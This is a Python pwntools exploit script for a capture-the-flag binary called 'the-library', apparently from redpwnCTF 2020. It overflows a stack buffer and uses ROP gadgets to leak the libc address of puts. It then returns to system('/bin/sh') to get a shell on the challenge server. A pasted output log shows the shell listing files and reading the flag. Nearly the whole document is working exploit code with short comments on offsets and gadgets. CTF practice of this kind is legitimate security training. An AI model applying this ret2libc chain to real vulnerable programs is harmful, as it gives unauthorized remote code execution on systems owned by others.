
#! /usr/bin/env python 2

from pwn import *

elf = ELF('./the-library')

Local = False  #Change it to false, when trying on main server

if Local == True:
    p = elf.process()
    
    libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    host="2020.redpwnc.tf"
    port= 31350
    libc = ELF('libc.so.6')
    r = remote(host,port)

#r = remote(host,port)
bin_sh_offset = 0x1b3e9a             # binsh_offset = hex(libc.search("/bin/sh\x00").next())
puts_offset =  0x0809c0              # puts_offset = hex(libc.symbols['puts'])
system_offset = 0x04f440             # system_offset = hex(libc.symbols['system'])
puts_got = p64(0x601018)             # puts_got   take this address from objdump -R <file>| grep 'puts'
puts_plt = p64(0x400520)             # puts_plt = hex(elf.symbols['puts'])
_start = p64(0x400550)               # get address by command      info functions

'''
Now use ropper to enumerate rop gadgets

$ ropper -- file the-library --search "% ?di"

0x0000000000400733: pop rdi; ret;
'''

pop_rdi = p64(0x0000000000400733)



# NOTE: _start symbol helps us to re-run the program after address enumeration
payload = ""
payload += "A"*24         # eip = ebp +8 = 16+8 = A*24
payload += pop_rdi        # return to pop_rdi gadget
payload += puts_got       # load rdi with puts_got address
payload += puts_plt       # call puts to leak address
payload += _start         # re-run the program

r.recvuntil("Welcome to the library... What's your name?")
r.sendline(payload)

a = r.recvline()
a = r.recvline()
a = r.recvline()
a = r.recvline()

libc_puts = u64(a[:8].strip().ljust(8,'\x00'))
libc_base = libc_puts - puts_offset
libc_system = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset

print("[*] Found libc puts %s"%(hex(libc_puts)))
print("[*] Found libc base %s"%(hex(libc_base)))
print("[*] Found libc system %s"%(hex(libc_system)))
print("[*] Found /bin/sh string %s"%(hex(bin_sh)))


# second stage

print(r.recvline())
'''
Searching for single ROP gadgets is the last resort in an
exploitation process.

Most of the time, we would like to return to another
function, and if needed, we can try to use single gadgets to
align the stack.

$ ropper -- file the-library --search "% ret"
'''
ret_gadget = p64(0x0000000000400506)

payload = ""
payload += "A"*24               # eip = ebp +8 = 16+8 = A*24
payload += ret_gadget           # used ret gadget to fix alignment issues
payload += pop_rdi              # return to pop_rdi gadget
payload += p64(bin_sh)          # pop bin_sh string into rdi
payload += p64(libc_system)     # return to system()
r.sendline(payload)

r.interactive()

'''
OUTPUT:
lakshay@lakshay-Lenovo-ideapad-320-15IKB:~/Desktop/triial/fifth_pwn$ python script_by_git.py 
[+] Opening connection to 2020.redpwnc.tf on port 31350: Done
[*] Found libc puts 0x7f0b9bf159c0
[*] Found libc base 0x7f0b9be95000
[*] Found libc system 0x7f0b9bee4440
[*] Found /bin/sh string 0x7f0b9c048e9a
Welcome to the library... What's your name?

[*] Switching to interactive mode
Hello there: 
AAAAAAAAAAAAAAAAAAAAAAAA\x06@
$ ls
Makefile
bin
dev
flag.txt
lib
lib32
lib64
libc.so.6
the-library
the-library.c
$ cat flag.txt
flag{jump_1nt0_th3_l1brary}
'''
